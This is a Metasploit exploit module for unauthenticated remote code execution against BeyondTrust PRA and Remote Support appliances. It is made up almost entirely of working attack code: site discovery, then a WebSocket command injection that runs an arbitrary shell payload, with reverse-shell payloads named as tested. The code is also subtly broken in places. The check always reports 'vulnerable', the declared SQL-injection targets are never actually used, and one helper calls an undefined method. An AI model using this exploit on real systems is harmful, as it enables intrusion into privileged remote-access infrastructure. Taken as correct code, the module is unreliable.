##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Rex::Proto::Http::WebSocket
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution',
        'Description' => %q{
          This exploit achieves unauthenticated remote code execution against BeyondTrust Privileged Remote
          Access (PRA) and Remote Support (RS). It leverages three different vulnerabilities depending on the
          user-selected target.

          The default target leverages CVE-2026-1731, a direct command injection affecting RS versions 25.3.1
          and prior, and PRA versions 24.3.4 and prior.

          Alternatively, the module can leverage a chain of CVE-2025-1094 (SQL injection in PostgreSQL)
          and CVE-2024-12356 (argument injection), affecting RS and PRA versions 24.3.1 and prior.

          Exploitation occurs with the privileges of the site user of the targeted BeyondTrust product site.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # Rapid7 Analysis and Metasploit module (CVE-2024-12356 / CVE-2025-1094)
          'Harsh Jaiswal', # Discovery of CVE-2026-1731
          'Jonah Burgess (CryptoCat)' # Added support for CVE-2026-1731
        ],
        'References' => [
          ['CVE', '2026-1731'], # Direct OS command injection in BeyondTrust
          ['CVE', '2025-1094'], # SQL injection in PostgreSQL code
          ['CVE', '2024-12356'], # Argument injection in BeyondTrust (may be combined with CVE-2025-1094)
          ['URL', 'https://www.beyondtrust.com/trust-center/security-advisories/bt26-02'], # Vendor advisory for CVE-2026-1731
          ['URL', 'https://www.beyondtrust.com/trust-center/security-advisories/bt24-10'], # Vendor advisory for CVE-2024-12356
          ['URL', 'https://www.postgresql.org/support/security/CVE-2025-1094/'], # Vendor advisory for CVE-2025-1094
          ['URL', 'https://attackerkb.com/topics/G5s8ZWAbYH/cve-2024-12356/rapid7-analysis'], # Rapid7 Analysis (CVE-2024-12356 / CVE-2025-1094)
          ['URL', 'https://attackerkb.com/topics/jNMBccstay/cve-2026-1731/rapid7-analysis'] # Rapid7 Analysis (CVE-2026-1731)
        ],
        'DisclosureDate' => '2026-02-06',
        'Platform' => [ 'linux', 'unix' ],
        'Arch' => [ARCH_CMD],
        'Privileged' => false, # Executes as the site user.
        'Targets' => [
          [
            'CVE-2026-1731 (Command Injection)', {
              'Payload' => {
                'DisableNops' => true,
                # We are injecting into a Bash arithmetic evaluation: a[$(command)]0.
                # We must avoid characters that break the subshell or the arithmetic structure.
                'BadChars' => '[$()]'
              }
            }
          ],
          [
            'CVE-2025-1094 (SQL Injection)', {
              'Payload' => {
                'DisableNops' => true,
                # Our payload is passed to the PHP function pg_escape_string. We want to avoid any single quotes
                # getting escaped unexpectedly. The server may be configured to escape double quotes (not by default).
                # We also want to avoid any backward slash characters if CVE-2024-12356 is being leveraged.
                'BadChars' => '\'"\\'
              }
            }
          ],
          [
            'CVE-2025-1094 (SQLi) with CVE-2024-12356 (Argument Injection)', {
              'Payload' => {
                'DisableNops' => true,
                # Our payload is passed to the PHP function pg_escape_string. We want to avoid any single quotes
                # getting escaped unexpectedly. The server may be configured to escape double quotes (not by default).
                # We also want to avoid any backward slash characters if CVE-2024-12356 is being leveraged.
                'BadChars' => '\'"\\'
              }
            }
          ]
        ],
        # NOTE: Tested with the following payloads:
        #   cmd/linux/http/x64/meterpreter/reverse_tcp
        #   cmd/unix/reverse_bash
        #   cmd/unix/generic
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true,
          # A writable directory on the target for fetch based payloads to write to.
          'FETCH_WRITABLE_DIR' => '/var/tmp',
          # Delete the fetch binary after execution.
          'FETCH_DELETE' => true,
          # By default, a deployed site, like Remote Support, is expected to be located at the root path.
          'URIPATH' => '/'
        },
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_advanced_options(
      [
        OptString.new('TargetCompanyName', [false, 'If set, use this name value to identify the company name of the deployed site. By default, this is auto discovered.']),
        OptString.new('TargetServerFQDN', [false, 'If set, use this FQDN value to identify the FQDN of the deployed site. By default, this is auto discovered.'])
      ]
    )
  end

  def check
    CheckCode::Vulnerable('Yaay!')
  end

  def exploit
    # For the deployed site being targeted (either Privileged Remote Access or Remote Support), we need to know either
    # the company name the site is registered to, or the FQDN of the deployed site. This is required to successfully
    # establish a WebSocket connection to the target site application. By default, we query the target site to
    # discover this, however a user can manually set either the expected company name or FQDN as a module option.
    site_info = get_site_info

    if site_info.nil?
      fail_with(Failure::UnexpectedReply, 'Failed to get the site info.')
    end

    vprint_status("Company name: #{site_info[:company]}")
    vprint_status("Site FQDN: #{site_info[:server]}")

    headers = {
      # This is the vulnerable application which is reachable over a WebSocket to the target site.
      'Sec-WebSocket-Protocol' => 'ingredi support desk customer thin'
    }

    if !site_info[:company].blank?
      print_status("Using company name: #{site_info[:company]}")

      headers['X-Ns-Company'] = site_info[:company]
    elsif !site_info[:server].blank?
      print_status("Using site FQDN: #{site_info[:server]}")

      headers['Host'] = site_info[:server]
    else
      fail_with(Failure::BadConfig, 'No company name or site FQDN set. Either set the TargetCompanyName or TargetServerFQDN option to a valid value, or clear them both to auto discover these values at run time.')
    end

    wsock = connect_ws(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'nw'),
      'headers' => headers
    )

    prefix = Rex::Text.rand_text_alpha(rand(1..5))
    suffix = rand(0..5)

    wsock.put_wstext("#{prefix}[$(#{payload.encoded})]#{suffix}\n")

    # Complete the sequence with randomized dummy data to avoid static artifacts
    wsock.put_wstext("#{SecureRandom.uuid}\n")     # remoteCookie
    wsock.put_wstext("#{rand(0..2)}\n")            # remoteAuthType (usually 0, 1, or 2)
    wsock.put_wstext("#{Rex::Text.rand_text_alpha(rand(4..8))}\n") # remoteGsKey

    while wsock.has_read_data? datastore['WFSDELAY']
      frame = wsock.get_wsframe

      break if frame.nil?

      if frame.header.opcode == Rex::Proto::Http::WebSocket::Opcode::CONNECTION_CLOSE
        print_warning('WebSocket closed unexpectedly! This may indicate that a patch has been applied, and the target is no longer vulnerable.')
        break
      end
    end

    wsock.wsclose
  rescue Rex::Proto::Http::WebSocket::ConnectionError => e
    if e.http_response && !e.http_response.body.blank?
      if e.http_response.body == 'Invalid company or app name'
        print_error("#{e.http_response.body} - Set either the TargetCompanyName or TargetServerFQDN option to a valid value.")
      else
        print_error(e.http_response.body)
      end
    end
    raise
  end

  # We need to know the target sites company name, or FQDN, in order to successfully establish a WebSocket connection.
  # We first favor the user setting either the TargetCompanyName or TargetServerFQDN options. If not set we then try
  # an undocumented API endpoint /get_mech_list, that should return the target site company name. Finally, we fall
  # back on the /download_client_connector endpoint which will also report a servername and site FQDN.
  def get_site_info
    if !datastore['TargetCompanyName'].blank? || !datastore['TargetServerFQDN'].blank?
      return {
        company: datastore['TargetCompanyName'],
        server: datastore['TargetServerFQDN']
      }
    end

    site_info = get_site_info_via_mech_list

    return site_info unless site_info.nil?

    get_site_info_via_download_client_connector
  end

  # The internal undocumented API located at the /get_mech_list endpoint will return the company name
  # of the target site. We try version=3 (JSON, newer instances) first, then fall back to version=2
  # (semicolon-separated key=value pairs, for older instances such as 22.x where version=3 returns HTTP 500).
  def get_site_info_via_mech_list
    %w[3 2].each do |version|
      opts = {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'get_mech_list'),
        'vars_get' => { 'version' => version }
      }
      opts['headers'] = { 'Accept' => 'application/json' } if version == '3'

      res = send_request_cgi(opts)
      next unless res&.code == 200

      company = version == '3' ? parse_mech_list_json(res) : parse_mech_list_text(res)
      next if company.blank?

      vprint_status("Got site info via the /get_mech_list?version=#{version} endpoint.")
      return { company: company, server: nil }
    end

    error('get_site_info_via_mech_list company not found.')
  end

  def parse_mech_list_json(res)
    res.get_json_document['company']
  end

  # Parses semicolon-separated key=value pairs (e.g. "company=sewtest;product=ingredi").
  def parse_mech_list_text(res)
    res.body.split(';').each do |part|
      part.strip!
      return part.sub('company=', '') if part.start_with?('company=')
    end
    nil
  end

  def get_site_info_via_download_client_connector
    res1 = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'download_client_connector'),
      'vars_get' => {
        'issue_menu' => '1'
      }
    )

    return module_error('get_site_info Connection 1 failed.') unless res1

    return module_error("get_site_info Request 1, unexpected response code #{res1.code}.") unless res1.code == 200

    return module_error('get_site_info_via_download_client_connector Request 1, unable to match data-html-url') unless res1.body =~ %r{data-html-url="\S+(/chat/html/\S+)"}i

    res2 = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, Rex::Text.html_decode(::Regexp.last_match(1)))
    )

    return module_error('get_site_info_via_download_client_connector Connection 2 failed.') unless res2

    return module_error("get_site_info_via_download_client_connector Request 2, unexpected response code #{res2.code}.") unless res2.code == 200

    return module_error('get_site_info_via_download_client_connector Request 2, unable to match data-company.') unless res2.body =~ /data-company="(\S+)"/i

    company = Rex::Text.html_decode(::Regexp.last_match(1))

    return module_error('get_site_info_via_download_client_connector Request 2, unable to match data-servers.') unless res2.body =~ /data-servers="(\S+)"/i

    servers = Rex::Text.html_decode(::Regexp.last_match(1))

    servers_array = JSON.parse(servers)

    return module_error('get_site_info_via_download_client_connector Request 2, data-servers not a valid array.') unless servers_array.instance_of? Array

    return module_error('get_site_info_via_download_client_connector Request 2, data-servers is an empty array.') if servers_array.empty?

    server = servers_array.first

    vprint_status('Got site info via the /download_client_connector endpoint.')

    { company: company, server: server }
  rescue JSON::ParserError
    module_error('get_site_info_via_download_client_connector JSON parse error.')
  end

  # Helper method to print an error and then return nil.
  def module_error(message)
    print_error(message)
    nil
  end
end
